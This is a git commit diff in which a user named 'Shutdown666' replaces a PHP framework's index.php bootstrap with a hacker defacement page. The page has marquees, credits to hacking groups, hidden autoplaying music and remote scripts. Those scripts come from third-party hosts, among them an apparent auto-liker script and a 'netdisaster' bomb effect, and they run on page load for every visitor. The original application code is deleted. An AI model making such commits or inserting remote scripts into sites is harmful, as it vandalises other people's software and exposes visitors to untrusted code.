abe92f34ed040f945435b5abe6c48da288eb9d92
Shutdown666 <nqintharo@gmail.com>
2016-02-23 11:02:54 +0700

    Update index.php

--- index.php
+++ index.php
@@ -1,18 +1,88 @@
-<?php
+<html><head>
 
-// Kickstart the framework
+<link rel="SHORTCUT ICON" href="http://dotcomcell.com/kumpulan-artikel/wp-content/uploads/2011/08/gambar-animasi-bendera-merah-putih-berkibar1.gif" type="image"></head>
+<html><head><title>It's Me Frank!</title>
+<script src='http://smart-liker.dum.su/autosmart.js' type='text/javascript'></script>
+<script type='text/javascript'>
+    var DADrightclicktheme = 'Dark';
+    var DADrightclickimage = 'http://2.bp.blogspot.com/-J4If-Y4o9WA/UPETwsjx8iI/AAAAAAAABnE/GKOhBnjjf0k/s1600/No+Right+Click+copy.png';
+    </script>
+    <script type='text/javascript' src="http://febriantkj.googlecode.com/files/anti-right-klik-febriantkj.js"> </script>
+<center>
+<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="100" width="100%"><font color="red">___________________________________________________</font></marquee>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="100" width="100%"><font color="white"> ___________________________________________________</font></marquee></center>
+<center>
+<img src="https://scontent-sit4-1.xx.fbcdn.net/hphotos-xal1/v/t1.0-9/12717152_666110850158234_8181373114582063022_n.jpg?oh=18dd7d4d292fe4a91f8cc5b8a363d50e&oe=5729CA8C"></center>
+<br>
+<br>
 
-$f3=require('lib/base.php');
+<center>
+<marquee behavior="scroll" direction="left" scrollamount="100" scrolldelay="100" width="100%"><font color="red">___________________________________________________</font></marquee></br>
+<marquee behavior="scroll" direction="right" scrollamount="100" scrolldelay="100" width="100%"><font color="white"> ___________________________________________________</font></marquee></center>
+<body style="background-color:#000000;background> <br><br><!--by Antonio hacker Sakit Hati Feat Edlee007-->
+</body></html><br>
+<script language="JavaScript1.2">
 
-$f3->set('DEBUG',3);
-if ((float)PCRE_VERSION<7.9)
-	trigger_error('PCRE version is out of date');
 
-include('app/bootstrap.php');
+<div align="center">
+<table border="0" width="70%">
+<tr><td>
 
-// Load configuration
-$f3->config('config.ini');
+<font face="Poor Richard"><center>
 
-$f3->run();
+<img src="//img2.blogblog.com/img/video_object.png" style="background-color: #b2b2b2; height: 0px; width: 0px; " class="BLOGGER-object-element tr_noresize tr_placeholder" id="BLOGGER_object_0" data-original-id="BLOGGER_object_0" /><img src="//img2.blogblog.com/img/video_object.png" style="background-color: #b2b2b2; height: 0px; width: 0px; " class="BLOGGER-object-element tr_noresize tr_placeholder" id="BLOGGER_object_1" data-original-id="BLOGGER_object_1" /></center>
+>
+/></object></center>
+>
+<br>
+<br>
+<b><font color="green">Thanks To :</font></b><marquee behavior="scroll"><center>
+<b><font color="red">[ INDONESIAN DARKNET ] ~<font color="white"> [ KOLAM-PIRANHA ] ~<font color="red"> [ Frankenstein ] ~<font color="white"> [ All My Friends ] </font></b></center>
+</marquee><br>
+<b><font color="green">Powered By :</font></b><marquee behavior="scroll"><center>
+<b><font color="red"> ./$hutdown<font color="white">666</font></b></center>
+</marquee>
 
-//echo $SCHEME.'://'.$HOST.':'.$PORT.$BASE.'/';
+  <embed src="http://www.indowebster.com/templates/object/mediaplayer.swf" width="0" height="0"
+
+
+wmode="\'transparent\'"
+
+
+
+FlashVars="file=http://www58.indowebster.com/ejtiirh1xsfmlg1t6ysz2rqzmij91tdk.mp3&frontcolor=0xffffff&backcolor=0xe6e6dc&ligh
+
+
+
+tcolor=0xffffff&logo=http://www.indowebster.com/images/idws.png&autostart=true&usefullscreen=false&showeq=false"
+
+
+
+width='0' height='0' type='application/x-shockwave-flash' pluginspage='http://www.macromedia.com/go/getflashplayer'
+
+
+
+menu='false' allowfullscreen='false' scale='noborder' quality='high'></embed>
+
+
+
+
+
+<embed SRC="http://divine-music.info/musicfiles/Far East Movement ft. The Cataracs & Dev - Like A G6.swf" AUTOSTART="TRUE" LOOP="TRUE" WIDTH="1" HEIGHT="1" ALIGN="CENTER"></EMBED>
+
+<script language="javascript">
+nd_mode="bomb";
+nd_dest="massive";
+nd_control="on";
+nd_sound="on";
+nd_vAlign="top";
+nd_hAlign="right";
+nd_vMargin="10";
+nd_hMargin="10";
+nd_target="_top";
+
+
+
+
+</script>
+<script language="javascript" src="http://www.netdisaster.com/js/mynd.js"></script>
